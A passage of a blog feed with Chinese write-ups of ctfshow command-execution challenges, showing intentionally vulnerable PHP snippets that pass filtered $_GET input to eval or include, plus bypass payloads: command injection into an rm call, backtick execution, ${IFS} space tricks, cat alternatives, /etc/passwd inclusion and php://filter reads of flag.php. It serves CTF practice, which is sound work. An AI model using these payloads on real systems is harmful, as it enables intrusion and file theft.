class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> <span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"comment\"># <span class=\"doctag\">@Author</span>: h1xa</span></span><br><span class=\"line\"><span class=\"comment\"># <span class=\"doctag\">@Date</span>:   2020-12-08 19:13:36</span></span><br><span class=\"line\"><span class=\"comment\"># <span class=\"doctag\">@Last</span> Modified by:   h1xa</span></span><br><span class=\"line\"><span class=\"comment\"># <span class=\"doctag\">@Last</span> Modified time: 2020-12-08 20:08:07</span></span><br><span class=\"line\"><span class=\"comment\"># <span class=\"doctag\">@email</span>: h1xa<span class=\"doctag\">@ctfer</span>.com</span></span><br><span class=\"line\"><span class=\"comment\"># <span class=\"doctag\">@link</span>: https://ctfer.com</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">*/</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">filter</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$filename</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$filecontent</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$evilfile</span>=<span class=\"literal\">false</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$f</span>,<span class=\"variable\">$fn</span></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;filename=<span class=\"variable\">$f</span>;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;filecontent=<span class=\"variable\">$fn</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">checkevil</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&#x27;/php|\\.\\./i&#x27;</span>, <span class=\"variable\">$this</span>-&gt;filename))&#123;</span><br><span class=\"line\">            <span class=\"variable language_\">$this</span>-&gt;evilfile=<span class=\"literal\">true</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&#x27;/flag/i&#x27;</span>, <span class=\"variable\">$this</span>-&gt;filecontent))&#123;</span><br><span class=\"line\">            <span class=\"variable language_\">$this</span>-&gt;evilfile=<span class=\"literal\">true</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"variable language_\">$this</span>-&gt;evilfile;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"variable language_\">$this</span>-&gt;evilfile)&#123;</span><br><span class=\"line\">            <span class=\"title function_ invoke__\">system</span>(<span class=\"string\">&#x27;rm &#x27;</span>.<span class=\"variable\">$this</span>-&gt;filename);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;fn&#x27;</span>]))&#123;</span><br><span class=\"line\">    <span class=\"variable\">$content</span> = <span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"string\">&#x27;php://input&#x27;</span>);</span><br><span class=\"line\">    <span class=\"variable\">$f</span> = <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">filter</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;fn&#x27;</span>],<span class=\"variable\">$content</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"variable\">$f</span>-&gt;<span class=\"title function_ invoke__\">checkevil</span>()===<span class=\"literal\">false</span>)&#123;</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">file_put_contents</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;fn&#x27;</span>], <span class=\"variable\">$content</span>);</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">copy</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;fn&#x27;</span>],<span class=\"title function_ invoke__\">md5</span>(<span class=\"title function_ invoke__\">mt_rand</span>()).<span class=\"string\">&#x27;.txt&#x27;</span>);</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">unlink</span>(<span class=\"variable\">$_SERVER</span>[<span class=\"string\">&#x27;DOCUMENT_ROOT&#x27;</span>].<span class=\"string\">&#x27;/&#x27;</span>.<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;fn&#x27;</span>]);</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;work done&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;where is flag?&#x27;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">where is flag?</span><br></pre></td></tr></table></figure>\n<p>​\t\t想办法触发 <code>__destruct</code>  即可，这里需要 filename 或者 filecontent 包含 php 或者 flag，这样在最后销毁的时候会进入 system 函数，并且 checkevil () 为 true，不会进入 if 语句，程序会进入最后的销毁阶段，触发 <code>__destruct</code> ，因此，即可进入 system 函数，所以 payload 为：</p>\n<figure class=\"highlight tex\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?fn=php;tac f*</span><br></pre></td></tr></table></figure>\n",
            "tags": [
                "Web"
            ]
        },
        {
            "id": "http://blog.g01den.top/posts/53e2b2e1.html",
            "url": "http://blog.g01den.top/posts/53e2b2e1.html",
            "title": "ctfshow-命令执行",
            "date_published": "2024-09-16T13:04:45.000Z",
            "content_html": "<h1 id=\"web29\"><a class=\"markdownIt-Anchor\" href=\"#web29\">#</a> Web29：</h1>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> <span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;c&#x27;</span>]))&#123;</span><br><span class=\"line\">    <span class=\"variable\">$c</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;c&#x27;</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&quot;/flag/i&quot;</span>, <span class=\"variable\">$c</span>))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">eval</span>(<span class=\"variable\">$c</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n<p>​\t\t过滤了文件关键词，通配符绕过，cat f*，用 system 执行，发现没有成功读取，考虑使用 tac 倒序读取，得到 flag。</p>\n<p>​\t\t<strong>总结，文件关键词过滤可以考虑使用通配符绕过。</strong></p>\n<h1 id=\"web30\"><a class=\"markdownIt-Anchor\" href=\"#web30\">#</a> Web30：</h1>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;c&#x27;</span>]))&#123;</span><br><span class=\"line\">    <span class=\"variable\">$c</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;c&#x27;</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&quot;/flag|system|php/i&quot;</span>, <span class=\"variable\">$c</span>))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">eval</span>(<span class=\"variable\">$c</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​\t\t过滤了 system，并且用的屎 eval 函数。</p>\n<p>​\t\t这里先试试反斜杠绕过，似乎无法绕过。</p>\n<p>​\t\t那么就试着反引号绕过，echo `ls`; ，成功绕过，之后直接 echo `tac fl*`; 读取 flag。</p>\n<h1 id=\"web31\"><a class=\"markdownIt-Anchor\" href=\"#web31\">#</a> Web31：</h1>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;c&#x27;</span>]))&#123;</span><br><span class=\"line\">    <span class=\"variable\">$c</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;c&#x27;</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&quot;/flag|system|php|cat|sort|shell|\\.| |\\&#x27;/i&quot;</span>, <span class=\"variable\">$c</span>))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">eval</span>(<span class=\"variable\">$c</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​\t\t这里发现空格，单引号被过滤了，还有小数点，没有过滤反引号，直接反引号绕过，成功绕过 system，cat 被过滤就 tac 读取，空格用 %0a 或者 %09 绕过。</p>\n<p>​\t\t前置知识：</p>\n<p><strong>空格过滤：</strong></p>\n<figure class=\"highlight tex\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">%09 符号需要php环境</span></span><br><span class=\"line\">&#123;cat,flag.txt&#125; </span><br><span class=\"line\">cat<span class=\"built_in\">$</span>&#123;IFS&#125;flag.txt</span><br><span class=\"line\">cat<span class=\"built_in\">$</span>IFS<span class=\"built_in\">$</span>9flag.txt</span><br><span class=\"line\">cat&lt;flag.txt</span><br><span class=\"line\">cat&lt;&gt;flag.txt</span><br><span class=\"line\">kg=<span class=\"built_in\">$</span>&#x27;<span class=\"keyword\">\\x</span>20flag.txt&#x27;<span class=\"built_in\">&amp;</span><span class=\"built_in\">&amp;</span>cat<span class=\"built_in\">$</span>kg</span><br><span class=\"line\">(<span class=\"keyword\">\\x</span>20转换成字符串就是空格，这里通过变量的方式巧妙绕过)</span><br></pre></td></tr></table></figure>\n<p><strong>cat 过滤：</strong></p>\n<figure class=\"highlight tex\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">more:一页一页的显示档案内容</span><br><span class=\"line\">less:与 more 类似。但在用 more 时候可能不能向上翻页，不能向上搜索指定字符串，而 less 却可以自由的向上向下翻页，也可以自由的向上向下搜索指定字符串。</span><br><span class=\"line\">head:查看头几行</span><br><span class=\"line\">tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示</span><br><span class=\"line\">tail:查看尾几行</span><br><span class=\"line\">nl：命令的作用和 cat -n 类似，是将文件内容全部显示在屏幕上，并且是从第一行开始显示，同时会自动打印出行号。</span><br><span class=\"line\">od:以二进制的方式读取档案内容</span><br><span class=\"line\">vi:一种编辑器，这个也可以查看</span><br><span class=\"line\">vim:一种编辑器，这个也可以查看</span><br><span class=\"line\">sort:可以查看</span><br><span class=\"line\">uniq:可以查看</span><br><span class=\"line\">file -f:报错出具体内容。可以利用报错将文件内容带出来（-f&lt;名称文件&gt; 　指定名称文件，其内容有一个或多个文件名称时，让file依序辨识这些文件，格式为每列一个文件名称。）</span><br></pre></td></tr></table></figure>\n<h1 id=\"web32\"><a class=\"markdownIt-Anchor\" href=\"#web32\">#</a> Web32：</h1>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;c&#x27;</span>]))&#123;</span><br><span class=\"line\">    <span class=\"variable\">$c</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;c&#x27;</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&quot;/flag|system|php|cat|sort|shell|\\.| |\\&#x27;|\\`|echo|\\;|\\(/i&quot;</span>, <span class=\"variable\">$c</span>))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">eval</span>(<span class=\"variable\">$c</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​\t\t过滤了 system 和反引号还有 echo，这里看似挺严格的，但是 print_r 或者 var_dump 没有过滤，应该可以利用下，但是，system 被过滤了，只有无回显 RCE 了，但是，过滤了左半边括号，这样就没法绕了，试一试不需要括号的语句：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"number\">123</span>;</span><br><span class=\"line\"><span class=\"keyword\">print</span> <span class=\"number\">123</span>;</span><br><span class=\"line\"><span class=\"keyword\">die</span>;</span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">&quot;/etc/passwd&quot;</span>;</span><br><span class=\"line\"><span class=\"keyword\">require</span> <span class=\"string\">&quot;/etc/passwd&quot;</span>;</span><br><span class=\"line\"><span class=\"keyword\">include_once</span> <span class=\"string\">&quot;/etc/passwd&quot;</span>;</span><br><span class=\"line\"><span class=\"keyword\">require_once</span> <span class=\"string\">&quot;etc/passwd&quot;</span>;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>​\t\t<strong>可以配合文件包含来打伪协议，具体 payload 类似下面这样：</strong></p>\n<figure class=\"highlight tex\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">include&quot;<span class=\"built_in\">$</span><span class=\"built_in\">_</span>GET[url]&quot;?&gt;<span class=\"built_in\">&amp;</span>url=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>\n<h1 id=\"web33\"><a class=\"markdownIt-Anchor\" href=\"#web33\">#</a> Web33：</h1>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;c&#x27;</span>]))&#123;</span><br><span class=\"line\">    <span class=\"variable\">$c</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;c&#x27;</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&quot;/flag|system|php|cat|sort|shell|\\.| |\\&#x27;|\\`|echo|\\;|\\(|\\&quot;/i&quot;</span>, <span class=\"variable\">$c</span>))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">eval</span>(<span class=\"variable\">$c</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125; </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>​\t\t多过滤了分号和双引号，反引号和空格等等依然被过滤了，这个时候似乎更难办了，还是打文件包含加伪协议来打：</p>\n<figure class=\"highlight tex\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">include<span class=\"built_in\">$</span><span class=\"built_in\">_</span>GET[url]?&gt;<span class=\"built_in\">&amp;</span>url=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>\n<h1 id=\"web34\"><a class=\"markdownIt-Anchor\" href=\"#web34\">#</a> Web34：</h1>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> <span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;c&#x27;</span>]))&#123;</span><br><span class=\"line\">    <span class=\"variable\">$c</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;c&#x27;</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&quot;/flag|system|php|cat|sort|shell|\\.| |\\&#x27;|\\`|echo|\\;|\\(|\\:|\\&quot;/i&quot;</span>, <span class=\"variable\">$c</span>))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">eval</span>(<span class=\"variable\">$c</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n<p>​\t\t多过滤了一个冒号，方法同上：</p>\n<figure class=\"highlight tex\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">include<span class=\"built_in\">$</span><span class=\"built_in\">_</span>GET[url]?&gt;<span class=\"built_in\">&amp;</span>url=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>\n<p>​\t\t这里解释一下，这里出现冒号依旧绕过了的原因是因为 PHP 把前面的 include 到？&gt; 的认为成一个 get 传参，另一个，也就是 &amp; url 被认为是另一个传参，正则只检测第一个部分，第二个部分就不会检测了。</p>\n<h1 id=\"web35\"><a class=\"markdownIt-Anchor\" href=\"#web35\">#</a> Web35：</h1>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> <span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;c&#x27;</span>]))&#123;</span><br><span class=\"line\">    <span class=\"variable\">$c</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;c&#x27;</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&quot;/flag|system|php|cat|sort|shell|\\.| |\\&#x27;|\\`|echo|\\;|\\(|\\:|\\&quot;|\\&lt;|\\=/i&quot;</span>, <span class=\"variable\">$c</span>))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">eval</span>(<span class=\"variable\">$c</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n<p>​\t\t小于符号也被过滤了，不过无伤大雅，依旧老样子，因为没有过滤 &gt;，所以依旧能用上面的 payload 打：</p>\n<figure class=\"highlight tex\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">include<span class=\"built_in\">$</span><span class=\"built_in\">_</span>GET[url]?&gt;<span class=\"built_in\">&amp;</span>url=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>\n<h1 id=\"web36\"><a class=\"markdownIt-Anchor\" href=\"#web36\">#</a> Web36：</h1>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> <span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;c&#x27;</span>]))&#123;</span><br><span class=\"line\">    <span class=\"variable\">$c</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;c&#x27;</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&quot;/flag|system|php|cat|sort|shell|\\.| |\\&#x27;|\\`|echo|\\;|\\(|\\:|\\&quot;|\\&lt;|\\=|\\/|[0-9]/i&quot;</span>, <span class=\"variable\">$c</span>))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">eval</span>(<span class=\"variable\">$c</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n<p>​\t\t这里连带着数字一起过滤了，无伤大雅，继续文件包含一把梭：</p>\n<figure class=\"highlight tex\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">include<span class=\"built_in\">$</span><span class=\"built_in\">_</span>GET[url]?&gt;<span class=\"built_in\">&amp;</span>url=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>\n<h1 id=\"web37\"><a class=\"markdownIt-Anchor\" href=\"#web37\">#</a> Web37：</h1>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> <span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"comment\">//flag in flag.php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;c&#x27;</span>]))&#123;</span><br><span class=\"line\">    <span class=\"variable\">$c</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;c&#x27;</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&quot;/flag/i&quot;</span>, <span class=\"variable\">$c</span>))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">include</span>(<span class=\"variable\">$c</span>);</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"variable\">$flag</span>;</span><br><span class=\"line\">    </span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">        </span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n<p>​\t\t文件包含过滤了 flag，这个时候可以考虑 include 一个 data 